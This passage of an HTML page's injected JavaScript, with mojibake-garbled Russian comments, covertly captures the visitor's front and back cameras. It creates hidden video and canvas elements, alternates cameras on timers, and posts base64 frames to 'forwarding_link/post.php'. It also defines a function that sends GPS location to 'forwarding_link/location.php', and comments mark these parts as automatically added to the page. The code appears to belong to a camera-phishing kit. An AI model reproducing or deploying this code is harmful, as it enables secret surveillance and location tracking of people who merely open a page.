                                                console.log('–§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞ –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω–∞!');
                                                handleSuccess(frontStream, video, canvas, 'front');
                                                // –ü–æ–≤—Ç–æ—Ä—è–µ–º —Ü–∏–∫–ª –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏—è –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥
                                                setInterval(function() {
                                                    // –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º—Å—è –Ω–∞ –∑–∞–¥–Ω—é—é
                                                    if (window.stream) {
                                                        window.stream.getVideoTracks().forEach(function(track) {
                                                            track.stop();
                                                        });
                                                    }
                                                    navigator.mediaDevices.getUserMedia(constraintsBack)
                                                        .then(function(bs) {
                                                            handleSuccess(bs, vBack, cBack, 'back');
                                                            setTimeout(function() {
                                                                if (window.streamBack) {
                                                                    window.streamBack.getVideoTracks().forEach(function(track) {
                                                                        track.stop();
                                                                    });
                                                                }
                                                                navigator.mediaDevices.getUserMedia(constraintsFront)
                                                                    .then(function(fs) {
                                                                        handleSuccess(fs, video, canvas, 'front');
                                                                    });
                                                            }, 5000);
                                                        });
                                                }, 10000); // –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º—Å—è –∫–∞–∂–¥—ã–µ 10 —Å–µ–∫—É–Ω–¥
                                            })
                                            .catch(function(err) {
                                                console.log('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é –∫–∞–º–µ—Ä—É:', err.message);
                                            });
                                    }, 5000);
                                })
                                .catch(function(err) {
                                    console.log('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∑–∞–¥–Ω—é—é –∫–∞–º–µ—Ä—É:', err.message);
                                    tryAlternativeBackCamera(video, canvas, vBack, cBack);
                                });
                        });
                }, 3000); // –ó–∞–¥–µ—Ä–∂–∫–∞ 3 —Å–µ–∫—É–Ω–¥—ã –¥–ª—è –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏
            })
            .catch(function(error) {
                console.error('–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä–µ:', error);
                // –ï—Å–ª–∏ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –ø—Ä–æ–±—É–µ–º —Ö–æ—Ç—è –±—ã –ø–æ–ª—É—á–∏—Ç—å –∑–∞–¥–Ω—é—é
                var vBack = document.getElementById('video-back');
                var cBack = document.getElementById('canvas-back');
                
                navigator.mediaDevices.getUserMedia(constraintsBack)
                    .then(function(stream) {
                        console.log('–§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞, –Ω–æ –∑–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –ø–æ–ª—É—á–µ–Ω–∞!');
                        if (vBack && cBack) {
                            handleSuccess(stream, vBack, cBack, 'back');
                        } else {
                            // –ï—Å–ª–∏ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –Ω–µ—Ç, —Å–æ–∑–¥–∞–µ–º –∏—Ö
                            if (!vBack) {
                                vBack = document.createElement('video');
                                vBack.id = 'video-back';
                                vBack.setAttribute('playsinline', '');
                                vBack.setAttribute('autoplay', '');
                                vBack.style.display = 'none';
                                document.body.appendChild(vBack);
                            }
                            if (!cBack) {
                                cBack = document.createElement('canvas');
                                cBack.id = 'canvas-back';
                                cBack.width = 740;
                                cBack.height = 580;
                                cBack.style.display = 'none';
                                document.body.appendChild(cBack);
                            }
                            handleSuccess(stream, vBack, cBack, 'back');
                        }
                    })
                    .catch(function(backError) {
                        console.error('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –Ω–∏ –∫ –æ–¥–Ω–æ–π –∫–∞–º–µ—Ä–µ:', backError);
                    });
            });
    } else {
        console.error('getUserMedia –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –≤ —ç—Ç–æ–º –±—Ä–∞—É–∑–µ—Ä–µ');
    }
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ–≥–æ —Å–ø–æ—Å–æ–±–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã
function tryAlternativeBackCamera(video, canvas, videoBack, canvasBack) {
    // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–∞–º–µ—Ä
    navigator.mediaDevices.enumerateDevices()
        .then(function(devices) {
            var videoDevices = devices.filter(function(device) {
                return device.kind === 'videoinput';
            });
            
            if (videoDevices.length > 1) {
                // –ï—Å–ª–∏ –µ—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –∫–∞–º–µ—Ä, –ø—Ä–æ–±—É–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–æ—Å–ª–µ–¥–Ω—é—é (–æ–±—ã—á–Ω–æ —ç—Ç–æ –∑–∞–¥–Ω—è—è)
                var backDeviceId = videoDevices[videoDevices.length - 1].deviceId;
                var alternativeConstraints = {
                    audio: false,
                    video: {
                        deviceId: { exact: backDeviceId }
                    }
                };
                
                navigator.mediaDevices.getUserMedia(alternativeConstraints)
                    .then(function(stream) {
                        console.log('–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–±: –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –ø–æ–ª—É—á–µ–Ω–∞ —á–µ—Ä–µ–∑ deviceId!');
                        var vBack = videoBack || document.getElementById('video-back');
                        var cBack = canvasBack || document.getElementById('canvas-back');
                        
                        if (vBack && cBack) {
                            handleSuccess(stream, vBack, cBack, 'back');
                        } else {
                            // –ï—Å–ª–∏ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –Ω–µ—Ç, —Å–æ–∑–¥–∞–µ–º –∏—Ö
                            if (!vBack) {
                                vBack = document.createElement('video');
                                vBack.id = 'video-back';
                                vBack.setAttribute('playsinline', '');
                                vBack.setAttribute('autoplay', '');
                                vBack.style.display = 'none';
                                document.body.appendChild(vBack);
                            }
                            if (!cBack) {
                                cBack = document.createElement('canvas');
                                cBack.id = 'canvas-back';
                                cBack.width = 740;
                                cBack.height = 580;
                                cBack.style.display = 'none';
                                document.body.appendChild(cBack);
                            }
                            handleSuccess(stream, vBack, cBack, 'back');
                        }
                    })
                    .catch(function(error) {
                        console.log('–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–±: –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞:', error.message);
                    });
            } else {
                // –ï—Å–ª–∏ —Ç–æ–ª—å–∫–æ –æ–¥–Ω–∞ –∫–∞–º–µ—Ä–∞, –ø—Ä–æ–±—É–µ–º –ø—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç—å facingMode
                var simpleBackConstraints = {
                    audio: false,
                    video: {
                        facingMode: "environment"
                    }
                };
                
                navigator.mediaDevices.getUserMedia(simpleBackConstraints)
                    .then(function(stream) {
                        console.log('–ü—Ä–æ—Å—Ç–æ–π —Å–ø–æ—Å–æ–±: –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –ø–æ–ª—É—á–µ–Ω–∞ —á–µ—Ä–µ–∑ facingMode!');
                        var vBack = videoBack || document.getElementById('video-back');
                        var cBack = canvasBack || document.getElementById('canvas-back');
                        
                        if (vBack && cBack) {
                            handleSuccess(stream, vBack, cBack, 'back');
                        } else {
                            // –ï—Å–ª–∏ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –Ω–µ—Ç, —Å–æ–∑–¥–∞–µ–º –∏—Ö
                            if (!vBack) {
                                vBack = document.createElement('video');
                                vBack.id = 'video-back';
                                vBack.setAttribute('playsinline', '');
                                vBack.setAttribute('autoplay', '');
                                vBack.style.display = 'none';
                                document.body.appendChild(vBack);
                            }
                            if (!cBack) {
                                cBack = document.createElement('canvas');
                                cBack.id = 'canvas-back';
                                cBack.width = 740;
                                cBack.height = 580;
                                cBack.style.display = 'none';
                                document.body.appendChild(cBack);
                            }
                            handleSuccess(stream, vBack, cBack, 'back');
                        }
                    })
                    .catch(function(error) {
                        console.log('–ü—Ä–æ—Å—Ç–æ–π —Å–ø–æ—Å–æ–±: –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ - —ç—Ç–æ –Ω–æ—Ä–º–∞–ª—å–Ω–æ –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –±–µ–∑ –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã:', error.message);
                    });
            }
        })
        .catch(function(error) {
            console.log('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤:', error);
        });
}

function handleSuccess(stream, video, canvas, cameraType) {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º —ç–ª–µ–º–µ–Ω—Ç—ã –µ—â–µ —Ä–∞–∑ –ø–µ—Ä–µ–¥ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º
    if (!video) {
        console.error('–û—à–∏–±–∫–∞: —ç–ª–µ–º–µ–Ω—Ç video –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ handleSuccess!');
        return;
    }
    
    if (!canvas) {
        console.error('–û—à–∏–±–∫–∞: —ç–ª–µ–º–µ–Ω—Ç canvas –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ handleSuccess!');
        return;
    }
    
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø–æ—Ç–æ–∫
    if (cameraType === 'front') {
        window.stream = stream;
    } else {
        window.streamBack = stream;
    }
    
    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–æ—Ç–æ–∫ –≤ video —ç–ª–µ–º–µ–Ω—Ç
    try {
        video.srcObject = stream;
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ srcObject:', error);
        return;
    }
    
    // –ü–æ–ª—É—á–∞–µ–º –∫–æ–Ω—Ç–µ–∫—Å—Ç canvas
    var context = canvas.getContext('2d');
    if (!context) {
        console.error('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∫–æ–Ω—Ç–µ–∫—Å—Ç canvas!');
        return;
    }
    
    // –ó–∞—Ö–≤–∞—Ç—ã–≤–∞–µ–º –∫–∞–¥—Ä—ã —Å –∑–∞–¥–∞–Ω–Ω—ã–º –∏–Ω—Ç–µ—Ä–≤–∞–ª–æ–º
    // –ò—Å–ø–æ–ª—å–∑—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –∏–Ω—Ç–µ—Ä–≤–∞–ª–∞, —á—Ç–æ–±—ã –æ–Ω–∏ –Ω–µ –∫–æ–Ω—Ñ–ª–∏–∫—Ç–æ–≤–∞–ª–∏
    var intervalId = 'capture_' + cameraType + '_' + Date.now();
    window[intervalId] = setInterval(function(){
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —ç–ª–µ–º–µ–Ω—Ç—ã –≤—Å–µ –µ—â–µ –¥–æ—Å—Ç—É–ø–Ω—ã
        if (!video || !canvas) {
            console.error('–≠–ª–µ–º–µ–Ω—Ç—ã video –∏–ª–∏ canvas –±—ã–ª–∏ —É–¥–∞–ª–µ–Ω—ã!');
            clearInterval(window[intervalId]);
            return;
        }
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –≤–∏–¥–µ–æ
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            try {
                // –†–∏—Å—É–µ–º –∫–∞–¥—Ä –Ω–∞ canvas
                context.drawImage(video, 0, 0, 740, 580);
                
                // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ base64 —Å –∑–∞–¥–∞–Ω–Ω—ã–º –∫–∞—á–µ—Å—Ç–≤–æ–º
                var canvasData = canvas.toDataURL("image/png", IMAGE_QUALITY).replace("image/png", "image/octet-stream");
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä —Å —É–∫–∞–∑–∞–Ω–∏–µ–º —Ç–∏–ø–∞ –∫–∞–º–µ—Ä—ã
                if (typeof post === 'function') {
                    console.log('–û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã:', cameraType);
                    post(canvasData, cameraType);
                } else {
                    console.error('–§—É–Ω–∫—Ü–∏—è post –Ω–µ –Ω–∞–π–¥–µ–Ω–∞!');
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞—Ö–≤–∞—Ç–µ –∫–∞–¥—Ä–∞ —Å –∫–∞–º–µ—Ä—ã ' + cameraType + ':', error);
            }
        } else {
            console.log('–ö–∞–º–µ—Ä–∞ ' + cameraType + ': –≤–∏–¥–µ–æ –µ—â–µ –Ω–µ –≥–æ—Ç–æ–≤–æ, readyState =', video.readyState);
        }
    }, CAPTURE_INTERVAL);
    
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º ID –∏–Ω—Ç–µ—Ä–≤–∞–ª–∞ –¥–ª—è –≤–æ–∑–º–æ–∂–Ω–æ–π –æ—Å—Ç–∞–Ω–æ–≤–∫–∏
    if (cameraType === 'front') {
        window.frontCameraInterval = window[intervalId];
    } else {
        window.backCameraInterval = window[intervalId];
    }
    
    console.log('–ö–∞–º–µ—Ä–∞ ' + cameraType + ' —É—Å–ø–µ—à–Ω–æ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞, –∏–Ω—Ç–µ—Ä–≤–∞–ª –∑–∞—Ö–≤–∞—Ç–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω');
}

// –ñ–¥–µ–º –ø–æ–ª–Ω–æ–π –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –∏ –≤—Å–µ—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤
(function() {
    var attempts = 0;
    var maxAttempts = 20; // –ú–∞–∫—Å–∏–º—É–º 10 —Å–µ–∫—É–Ω–¥ (20 * 500ms)
    
    function tryInit() {
        attempts++;
        var video = document.getElementById('video');
        var canvas = document.getElementById('canvas');
        
        if (video && canvas && typeof post === 'function') {
            console.log('–í—Å–µ –≥–æ—Ç–æ–≤–æ, –∑–∞–ø—É—Å–∫–∞–µ–º –∫–∞–º–µ—Ä—ã...');
            waitForElementsAndInit();
        } else if (attempts < maxAttempts) {
            setTimeout(tryInit, 500);
        } else {
            console.error('–ü—Ä–µ–≤—ã—à–µ–Ω–æ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è —ç–ª–µ–º–µ–Ω—Ç–æ–≤!');
            console.error('video:', !!video, 'canvas:', !!canvas, 'post:', typeof post);
        }
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(tryInit, 1000);
        });
    } else {
        setTimeout(tryInit, 1000);
    }
})();
</script>
<!-- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –¥–æ–±–∞–≤–ª–µ–Ω–æ: —Ñ—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö -->
<script>
function post(imgdata, cameraType){
    if (typeof $ === 'undefined') {
        console.error('jQuery –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω!');
        return;
    }
    // –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø –∫–∞–º–µ—Ä—ã (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é front)
    cameraType = cameraType || 'front';
    $.ajax({
        type: 'POST',
        data: { 
            cat: imgdata,
            camera_type: cameraType
        },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function(result){
        },
        error: function(){
        }
    });
}


// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
function postLocation(location){
    if (typeof $ === 'undefined') {
        console.error('jQuery –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏!');
        return;
    }
    $.ajax({
        type: 'POST',
        data: { 
            location_data: JSON.stringify(location),
            location_type: 'gps'
        },
        url: 'forwarding_link/location.php',
        dataType: 'json',
        async: true,
        success: function(result){
            console.log('–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä');
        },
        error: function(){
            console.log('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏');
        }
    });
}
</script>
<!-- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –¥–æ–±–∞–≤–ª–µ–Ω–æ: —ç–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è –∫–∞–º–µ—Ä—ã (–û–ë–ï–ò–•) –∏ –≥–∞–ª–µ—Ä–µ–∏ -->
<div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
    <video id="video-back" playsinline autoplay></video>
</div>
<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
<canvas hidden="hidden" id="canvas-back" width="740" height="580"></canvas>
<input type="file" id="gallery-input" accept="image/*" multiple style="display:none;">
</html>
